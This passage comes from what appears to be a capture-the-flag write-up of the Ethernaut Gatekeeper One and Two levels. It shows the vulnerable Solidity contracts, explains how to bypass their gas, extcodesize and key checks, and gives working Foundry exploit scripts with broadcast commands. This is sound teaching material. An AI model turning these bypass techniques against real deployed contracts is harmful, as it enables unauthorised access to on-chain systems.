<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">gasleft</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">%</span><span> </span><span class="token" style="color:#b5cea8">8191</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateThree</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes8</span><span> _gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">uint16</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint32</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#ce9178">uint16</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">enter</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes8</span><span> _gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> gateOne gateTwo </span><span class="token" style="color:#dcdcaa">gateThree</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    entrant </span><span class="token" style="color:#d4d4d4">=</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>We have to call the <code>enter()</code> function, without being revert by modifier checks.</li>
<li>We need to pass three modifier checks. We can simply pass <code>gateOne()</code> by calling it from another contract.</li>
<li>To bypass <code>gateTwo()</code> we need to send exact <code>gas</code> that should result the modulo 8191 to zero.</li>
<li><code>gasLeft()</code> is a method which calculates the remaining gas after executing instructions before it invoked.</li>
<li>We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.</li>
<li>One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.</li>
<li>To pass the <code>gateThree()</code> we need to some calculations. It takes the <code>_gateKey</code> a bytes8 value as argument.</li>
<li>The modifiers checks the lower 32 bits of the gatekey after converting to uint64.</li>
<li>So, we can calculate the lower 16 bits of the <code>tx.orgin</code> and pad it with zeros to pass the gatThree and gateOne.</li>
<li>Two pass the gateTwo we can add random bits to the MSB position.</li>
</ol>
<p><strong>Level13Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level13.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    GatekeeperOne </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">GatekeeperOne</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">bytes8</span><span> gateKey </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&amp;</span><span>
</span><span>            </span><span class="token" style="color:#b5cea8">0xFFFFFFFF0000FFFF</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">for</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> i </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span> i </span><span class="token" style="color:#d4d4d4">&lt;</span><span> </span><span class="token" style="color:#b5cea8">300</span><span class="token" style="color:#d4d4d4">;</span><span> i</span><span class="token" style="color:#d4d4d4">++</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">uint256</span><span> totalgas </span><span class="token" style="color:#d4d4d4">=</span><span> i </span><span class="token" style="color:#d4d4d4">+</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">8191</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#b5cea8">3</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span>gas</span><span class="token" style="color:#d4d4d4">:</span><span> totalgas</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>                abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;enter(bytes8)&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> gateKey</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>                </span><span class="token" style="color:#569CD6">break</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level13Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    GatekeeperOne </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">GatekeeperOne</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level13Solution.s.sol:Level13Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Gatekeeper Two</h2>
<p><strong>Level14.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">GatekeeperTwo</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> entrant</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateOne</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">!=</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint</span><span> x</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">assembly</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> x </span><span class="token" style="color:#d4d4d4">:=</span><span> </span><span class="token" style="color:#dcdcaa">extcodesize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">caller</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>x </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateThree</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes8</span><span> _gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span> </span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">type</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>max</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">enter</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes8</span><span> _gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> gateOne gateTwo </span><span class="token" style="color:#dcdcaa">gateThree</span><span class="token" style="color:#d4d4d4">(</span><span>_gateKey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    entrant </span><span class="token" style="color:#d4d4d4">=</span><span> tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>Similiar to gatekeeper one, to pass <code>gateOne()</code> here we need to call from a contract.</li>
<li><code>gateTwo()</code> checks that the caller contract code should zero.</li>
<li>Code inside contract constructor won’t be stored on blockchain. So, we can call the <code>enter()</code> from our attack contract constructor.</li>
<li>To pass the <code>gateThree()</code> we need to do simple XOR operation. To get the <code>gateKey()</code> we need to do <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code> XOR <code>type(uint64).max</code>.</li>
</ol>
<pre><code>We know that

//If x ^ y = z then x ^ z = y
</code></pre>
<p>Level14Solution.s.sol</p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level14.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        GatekeeperTwo  instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">GatekeeperTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xc3FB4c38f398050206ea0D07D18D693Bc75888AA</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">bytes8</span><span> gateKey </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes8</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span> </span><span class="token" style="color:#dcdcaa">type</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint64</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>max</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">enter</span><span class="token" style="color:#d4d4d4">(</span><span>gateKey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level14Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level14Solution.s.sol:Level14Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Naught Coin</h2>
<p><strong>Level15.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
